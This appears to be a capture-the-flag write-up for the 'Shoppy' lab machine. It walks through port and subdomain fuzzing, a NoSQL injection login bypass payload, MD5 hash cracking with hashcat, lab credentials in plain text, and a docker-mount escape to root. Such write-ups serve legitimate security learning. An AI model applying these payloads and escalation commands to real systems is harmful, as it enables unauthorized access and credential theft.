![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360c5003abe63ea2c6fbff4_Shoppy.png)

### Nmap

Nmap Shows only 2 open ports:  
22/tcp SSH  
80/tcp HTTP

![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360c65e720e3f6a194da2eb_01-nmap.png)

### Directory Fuzzing

Quick directory scan with gobuster
![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360c6be78f08dcea63b0e08_02-gobuster.png)

### SubDomains Fuzzing

Fuzzing for subdomains we found one with the wordlist **bitquark-subdomains-top100000.txt** 
```sh
ffuf -H "Host: FUZZ.shoppy.htb" -w
/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u
http://FUZZ.shoppy.htb
```

![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360cc603abe63473f70078d_08-FFuf.png)

### SQLi Login Bypass

We can try some login bypass **SQLinjection** and we obtain access with a NoSQL injection.
<https://book.hacktricks.xyz/pentesting-web/nosql-injection>  

```
admin' || '"_"
```

![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360c8f69c0f3628d7f9c74b_04-sqli.png)

This is the internal Dashboard of the webapp.

![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360c8f177b2ce065a8b2586_05-adminpage.png)

  
If we click the "**search for users**" button, and we use the same sqli we used for the login it will give us a json export with credentials to download.
‍

![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360ca80701e5f5e26897c4f_06-search.png)![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360cac1bccf18280b20f411_07-json.png)

### Mattermost

**Josh** credentials works in the subdomain page. The password is an MD5 crackable with **john the ripper** or **hashcat**

```sh
hashcat '6ebcea65320589ca4f2f1ce039975995' -a 0 -m 0 --wordlist /usr/share/wordlists/rockyou.txt
```

Go to http://mattermost.shoppy.htb  and you'll be redirect to a login page and use this credentials:  
User: **josh**  
Pass: **remembermethisway**

Once inside the subdomain dashboard we find very interesting info that will give us **ssh access** and will help us later with the **privesc to become root**

![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360d1b383fe8784c1544f39_09-mattermost.png)

Usiamo le seguenti credenziali di accesso per ssh  
username: **jaeger**  
password: **Sh0ppyBest@pp!**
### SSH

![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360d23f26a735312a2f5069_10-ssh.png)

Inside the home folder we notice that there are 2 folders **jaeger** and **deploy**.
Inside deploy there are three files
![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360d3324e80021b6b83c27c_11_1-password-manager.png)

If we just cat the **"password manager"** bin we can see the password: **Sample**
```sh
cat /home/deploy/password-manager  
```

![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360d44a77b2ce801d8bb558_11-password-manager.png)

So we have the password to execute the binary as deploy:
```sh
sudo -u deploy /home/deploy/password-manager
```

![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360d5144e800217f383de86_12-deploy.png)

We now have the credentials to become deploy user, we can access via ssh
```sh
ssh deploy@localhost
```

### Privesc to Root

We know we are inside a **Docker** thanks to the kind message from **mattermost.shoppy.htb**

![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360d5686855c969745ec2f2_docker-enum.png)

We can look for a command that allow us to privesc to root on GTOBINS!
‍[https://gtfobins.github.io/gtfobins/docker  
‍](https://gtfobins.github.io/gtfobins/docker/)

```sh
docker run -v /:/mnt --rm -it alpine chroot /mnt sh  
```

![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360d6ab82ec262ee6cd53be_14-root.png)

**ROOT!**